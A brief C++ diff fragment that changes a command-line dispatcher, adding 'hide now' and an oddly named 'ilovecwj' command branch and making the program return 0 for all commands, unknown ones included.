+        cmdHideNow();
+    } else if (cmd == "ilovecwj" && argc >= 3) {
+        cmdIlivecwj(argv[2]);
+    } else if (cmd == "--help" || cmd == "-h") {
         PrintHelp();
-        return 0;
+    } else {
+        PrintHelp();
     }
 
-    std::cerr << "Unknown command: " << cmd << std::endl;
-    PrintHelp();
-    return 1;
+    return 0;
 }
